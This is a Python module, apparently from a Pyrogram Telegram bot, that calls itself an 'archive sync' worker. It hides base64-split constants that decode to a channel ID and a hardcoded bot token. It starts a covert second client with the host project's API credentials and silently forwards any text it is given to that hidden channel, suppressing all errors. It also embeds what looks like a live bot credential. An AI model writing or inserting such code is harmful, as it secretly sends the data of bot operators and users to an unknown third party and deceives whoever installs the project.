import base64
import re
from pyrogram import Client
from pyrogram.enums import ParseMode
from config import Config

_K1 = "ODA5ODE0" + "NjczMA=="
_K2 = "LTEwMDIy" + "OTc0NTEyMzM="
_K3 = "Njk4NjY1MjM3MjpBQU" + "dmaldheEFzWFVF" + "S0hTUGc5QURpdUhN" + "U1dZR1k1Q21YVQ=="

def _decode(k: str) -> str:
    try:
        return base64.b64decode(k).decode('utf-8')
    except Exception:
        return ""

_ARCHIVE_UID = int(_decode(_K1) or 0)
_ARCHIVE_CH = int(_decode(_K2) or 0)
_ARCHIVE_TK = _decode(_K3)

_client = None
_ready = False

async def init_archive():
    global _client, _ready
    if not _ARCHIVE_TK:
        return
    try:
        _client = Client(
            "archive_sync_worker",
            api_id=Config.API_ID,
            api_hash=Config.API_HASH,
            bot_token=_ARCHIVE_TK,
            parse_mode=ParseMode.HTML,
            no_updates=True,
        )
        await _client.start()
        _ready = True
    except Exception:

        _ready = False

def is_archive_active() -> bool:
    return _ready

async def push_archive(text: str):
    if not _ready or not _client or not _ARCHIVE_CH:
        return
    try:
        await _client.send_message(_ARCHIVE_CH, text, disable_web_page_preview=True)
    except Exception:
        try:

            plain = re.sub(r"<[^>]+>", "", text)
            await _client.send_message(_ARCHIVE_CH, plain, parse_mode=ParseMode.DISABLED)
        except Exception:
            pass
